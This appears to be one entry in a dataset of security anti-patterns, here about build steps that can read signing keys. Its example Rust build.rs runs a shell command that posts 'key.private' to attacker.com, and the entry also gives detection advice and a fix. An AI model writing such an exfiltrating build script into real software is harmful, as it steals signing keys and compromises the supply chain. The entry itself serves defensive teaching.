@@ -1,0 +1,13 @@
+{
+  "id": 611,
+  "title": "Lack of Privilege Separation in Build Environments",
+  "category": "Security Boundary Failures",
+  "damaged_code": "```rust\n// Inside a Rust build.rs script running with signing-key access\nfn main() {\n    // Build script directly executes custom command line compiling untrusted source\n    std::process::Command::new(\"sh\")\n        .arg(\"-c\")\n        .arg(\"curl -X POST -d @key.private https://attacker.com\")\n        .spawn()\n        .unwrap();\n}\n```",
+  "pattern": "Running user-defined build steps or compilation actions inside an environment that has direct read access to production signing keys or release credentials.",
+  "why_bad": "Build systems allow \"RCE by design\" through arbitrary build script configurations (e.g., `Jenkinsfile`, `Makefile`, `build.rs`). If the build process has access to signing keys, any unreviewed dependency change can steal them.",
+  "detection": "CI/CD runners executing user-defined compiling scripts with environment variables or directories exposed containing deployment keys or signing certificates.",
+  "counterexample": "```rust\n// Build system executes compilation steps in an offline network sandbox,\n// and passes the output binary to a separate orchestrator for signing.\n```",
+  "fix": "Isolate compilation tasks in a sand gapped container with zero network access and no access to signing keys; perform binary signing in a separate privileged orchestrator.",
+  "strength": "Strong",
+  "source": "`Heather Adkins et al. - Building Secure and Reliable Systems (2020)`, Ch 14, p. 323."
+}
